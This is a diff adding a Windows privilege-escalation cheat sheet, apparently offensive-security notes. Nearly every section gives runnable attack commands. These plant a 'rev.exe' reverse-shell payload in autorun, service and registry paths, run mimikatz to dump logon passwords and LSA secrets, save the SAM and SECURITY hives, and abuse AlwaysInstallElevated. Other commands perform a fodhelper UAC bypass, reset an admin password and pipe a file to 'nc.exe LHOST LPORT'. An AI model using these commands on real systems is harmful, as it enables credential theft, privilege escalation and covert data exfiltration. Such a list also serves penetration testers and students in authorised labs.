@@ -1,0 +1,97 @@
+# general/os
+systeminfo
+hostname
+tasklist /SVC
+wmic qfe get Caption, Description, HotFixID, InstalledOn # installed hotfixes
+wmic product get name, version, vendor # installed software
+driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path # enum kernel/driver
+Get-Process -IncludeUserName | Select-Object Id,Name,Username,Path | Format-List
+
+# users
+whoami /all
+whoami /priv
+whoami /groups
+net user
+net user /domain
+net user /domain some_user_name
+net user %username%
+net localgroup <group> <user> /add # add user to group
+net user admin Password1! # change password
+
+# network
+ipconfig /all
+route print
+netstat -ano
+netsh advfirewall show currentprofile
+netsh advfirewall firewall show rule name=all
+
+# tasks
+schtasks /query /fo LIST /v
+schtasks
+
+# files
+accesschk.exe -uws "Everyone" "C:\Program Files"
+mountvol
+dir /S /B
+CACLS file_path /e /p <user>:F # set full permissions to file
+icacls "C:\"
+accesschk.exe -uws "Everyone" "C:\Program Files"
+Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
+dir *StickyNotes* /S /B
+
+# autostart writeable
+C:\Windows\tasks\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+
+## autorun registry
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+C:\Windows\tasks\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\<autorun-exe>.exe"
+copy C:\Windows\tasks\rev.exe "C:\Program Files\Autorun Program\<autorun-exe>.exe" /
+
+# creds
+cmdkey /list -> runas /savecred /user:admin C:\Windows\tasks\rev.exe
+mimikatz64.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
+reg query HKLM /f password /t REG_SZ /s
+
+## sam / hive
+reg save HKLM\sam sam
+reg save HKLM\system system
+reg save HKLM\security security
+
+# always elevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+msiexec /quiet /qn /i C:\Windows\tasks\rev.msi
+
+# services
+sc create service-name binPath= "C:\windows\tasks\rev.exe"
+sc config service-name binpath="c:\windows\tasks\rev.exe" # set binpath
+wmic service service-name get Pathname
+sc query service-name 5000
+sc start service-name
+sc stop service-name
+
+## unquoted path
+C:\Windows\tasks\accesschk.exe /accepteula -uwcqv user *
+C:\Windows\tasks\accesschk.exe /accepteula -uwdq "C:\Some Path\to\service"
+
+## insecure service exe
+C:\Windows\tasks\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\<service-exe>.exe"
+copy C:\Windows\tasks\rev.exe "C:\Program Files\File Permissions Service\<service-exe>.exe" /Y
+
+# registry
+reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
+
+## weak registry permission
+C:\Windows\tasks\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<service>
+reg add HKLM\SYSTEM\CurrentControlSet\services\<service> /v ImagePath /t REG_EXPAND_SZ /d C:\Windows\tasks\rev.exe /f
+
+# uac bypass
+REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "c:\windows\tasks\rev.exe" /f
+C:\Windows\Sysnative\cmd.exe /c "powershell Start-Process C:\Windows\System32\fodhelper.exe -WindowStyle Hidden
+
+# other
+type important_file.txt | nc.exe LHOST LPORT
+powershell.exe -executionpolicy bypass -file some_file.ps1
+powershell.exe Start-Process cmd.exe -Verb runAs
